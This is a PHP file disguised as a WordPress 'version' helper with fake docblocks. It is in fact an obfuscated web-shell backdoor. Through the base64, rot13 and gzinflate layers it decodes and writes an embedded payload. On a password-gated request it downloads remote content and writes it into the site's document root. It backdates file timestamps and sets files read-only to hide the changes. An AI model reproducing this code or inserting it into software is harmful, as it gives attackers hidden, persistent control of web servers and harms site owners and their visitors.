<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y2kuozq1LJqypl9uMT1cov1gLJyhYH5nYaOi', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("w{$check}pwrqdijo", 'ff44338658086b6b35ba0f8fe923f2af')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}